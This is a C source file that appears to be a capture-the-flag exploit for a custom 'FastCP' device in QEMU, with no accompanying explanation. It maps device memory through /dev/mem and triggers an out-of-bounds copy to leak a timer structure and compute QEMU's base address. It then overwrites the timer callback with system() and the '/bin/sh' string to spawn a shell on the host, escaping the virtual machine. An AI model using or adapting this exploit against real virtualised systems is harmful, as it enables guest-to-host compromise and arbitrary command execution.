#include <inttypes.h> // type
#include <stdio.h>
#include <string.h>
#include <stdlib.h> // exit
#include <unistd.h> // file
#include <fcntl.h> // open
#include <sys/mman.h> // mmap
//#include <assert.h>

void *mmio_mem = 0;

int die(const char *err_info){
    printf("[-] Exit with: %s.\n", err_info);
    exit(-1);
}
/*
#define PAGE_SHIFT  12
#define PFN_PRESENT (1ull<<63)
#define PFN_PFN     ((1ull<<55)-1)

uint32_t page_offset(uint32_t addr){
    return addr&((1<<PAGE_SHIFT)-1);
}

uint64_t gva_to_gfn(uint64_t addr){
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if(fd<0){
        perror("open");
        exit(1);
    }
    size_t offset = ((uintptr_t)addr>>9)&~7; // vir>>12<<3
    lseek(fd, offset, SEEK_SET);
    uint64_t pme, gfn;
    read(fd, &pme, 8);
	close(fd);
    if(!(pme&PFN_PRESENT)) return -1;
    gfn = pme&PFN_PFN;
    return gfn;
}

uint64_t gva_to_gpa(uint64_t addr){
    uint64_t gfn = gva_to_gfn(addr);
    assert(gfn!=-1);
    return (gfn<<PAGE_SHIFT)|page_offset(addr);
}
*/
void mmio_write(uint64_t addr, uint64_t val){
    *(uint64_t *)((uint64_t)mmio_mem+addr) = val;
}

uint64_t mmio_read(uint64_t addr){
    return *(uint64_t *)((uint64_t)mmio_mem+addr);
}

/**
	0	bool handling
	8	FastCP_CP_INFO *CP_list_src
	16	FastCP_CP_INFO *CP_list_cnt
	24	uint64_t cmd
*/

typedef struct{
	uint64_t CP_src;
	uint64_t CP_cnt;
	uint64_t CP_dst;
} cp_info;

const uint32_t mmio_base = 0x00000000fea00000;
const uint32_t mmio_size = 0x1000;
const uint32_t map_base = 0x1000;

int main(){
    int fd = open("/dev/mem", O_RDWR|O_SYNC);
    if(fd<0) die("OPEN ERROR!");
    mmio_mem = mmap(NULL, mmio_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, mmio_base);
    if(mmio_mem==MAP_FAILED) die("MMAP ERROR!");
    printf("[+] Mmap mmio physical memory to [%p].\n", mmio_mem);
	uint64_t buffer = (uint64_t)mmap(NULL, 0x2000, PROT_READ|PROT_WRITE, MAP_SHARED, fd, map_base);
    if((void *)buffer==MAP_FAILED) die("MMAP ERROR!");
	printf("[*] buffer %#lx.\n", buffer);
	close(fd);

	cp_info info[0x11] = {map_base, 0x1020, map_base};
	for(int i = 1;i<0x11;i++){
		info[i].CP_src = map_base;
		info[i].CP_cnt = 0x10;
		info[i].CP_dst = map_base;
	}
	memcpy((void *)(buffer+0x1200), info, sizeof(info));
	mmio_write(8, map_base+0x1200); // src
	mmio_write(16, 1); // cnt
	printf("[*] CP_list_src %#lx.\n", mmio_read(8));
	mmio_write(24, 4);
/**
	0	expire_time
	8	timer_list
	16	cb
	24	opaque
-> timerlist_run_timers // https://github.com/qemu/qemu/blob/master/util/qemu-timer.c
	cb = ts->cb;
	opaque = ts->opaque;
	cb(opaque);
*/
	do{sleep(1);} while(mmio_read(0));
	uint64_t addr = *(uint64_t *)(buffer+0x1010)-0x4dce80;
	printf("[*] baseaddr %#lx.\n", addr);
	printf("[*] opaque %#lx.\n", *(uint64_t *)(buffer+0x1018));
	if((int64_t)addr<0) return 0;

	*(uint64_t *)(buffer+0x1010) = addr+0x2C2180; // system
	*(uint64_t *)(buffer+0x1018) = addr+0x846F4C; // "/bin/sh\0"
	mmio_write(16, 0x11); // cnt
	printf("[*] CP_list_src %#lx.\n", mmio_read(8));
	mmio_write(24, 1);
    return 0;
}